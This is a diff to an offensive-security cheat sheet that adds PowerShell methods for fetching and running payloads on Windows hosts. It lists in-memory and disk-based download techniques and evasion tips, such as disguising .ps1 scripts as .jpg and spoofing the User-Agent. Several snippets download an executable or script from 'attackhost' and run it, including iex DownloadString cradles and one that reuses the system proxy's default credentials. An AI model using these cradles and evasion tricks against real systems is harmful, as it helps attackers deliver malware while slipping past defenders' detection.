@@ -1,15 +1,69 @@
 ##### [Execute PowerUp.ps1](../../../../Tools/Shells/Windows/PowerShell/PowerSploit/PowerUp.md)
 
+# In-Memory Execution Methods
+* Net.WebClient DownloadString (method)
+* Net.WebClient DownloadData (method)
+* Net.WebClient OpenRead (method)
+* .NET Net.HttpWebRequest (class)
+* Word.Application (COM)
+* Excel.Application (COM)
+* InternetExplorer.Application (COM)
+* MsXml2.ServerXmlIHttp (COM)
+* Certutil.exe w/ -ping argument
+
+# Disk-Based Execution Methods
+* Net.WebClient Download File
+* BITSAdmin.exe
+* Certutil.exe w/ -urlcache argument
+
+# Evasion
+* Use In-Memory execution.
+* Use SSL when downloading scripts.
+* Use a script extension other than .ps1, such as .jpg.
+* Specify User-Agent with Net.WebClient
+
 # Download File
-##### Download File To Disk
-```bash
+### Download File To Disk
+```powershell
 powershell -c wget "http://<Source Address>/<Source File>" -outfile "<Output File>"
+```
+##### Using Variables and User-Agent
+```powershell
+PS C:\> $downloader = New-Object System.Net.WebClient
+PS C:\> $downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
+PS C:\> $payload = "https://attackhost/file.exe"
+PS C:\> $local_file = "file.exe"
+PS C:\> $downloader.DownloadFile($payload, $local_file)
+PS C:\> & $local_file # Execute file.
+```
+##### Using System's Proxy and Default Credentials
+```powershell
+PS C:\> $downloader = New-Object System.Net.WebClient
+PS C:\> $downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
+PS C:\> $proxy = [Net.WebRequest]::GetSystemProxy()
+PS C:\> $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
+PS C:\> $downloader.Proxy = $proxy
+PS C:\> $payload = "https://attackhost/file.exe"
+PS C:\> $local_file = "file.exe"
+PS C:\> $downloader.DownloadFile($payload, $local_file)
 ```
 
 ### Download File To String
-##### From Meterpreter PowerShell Prompt
-```bash
-PS > iex (New-Object Net.WebClient).DownloadString('http://[Attack Host]/[Source File]')
+##### From CMD Prompt
+```powershell
+C:\> powershell iex (New-Object Net.WebClient).DownloadString('http://[Attack Host]/[Source File]')
+```
+##### From PowerShell Prompt
+```powershell
+PS C:\> iex (New-Object Net.WebClient).DownloadString('http://[Attack Host]/[Source File]')
+```
+##### Using Variables and User-Agent
+```powershell
+PS C:\> $downloader = New-Object System.Net.WebClient
+PS C:\> $downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
+PS C:\> $payload = "https://attackhost/script.ps1"
+PS C:\> $command = $downloader.DownloadString($payload)
+PS C:\> Invoke-Expression $command
 ```
 
 # Processes
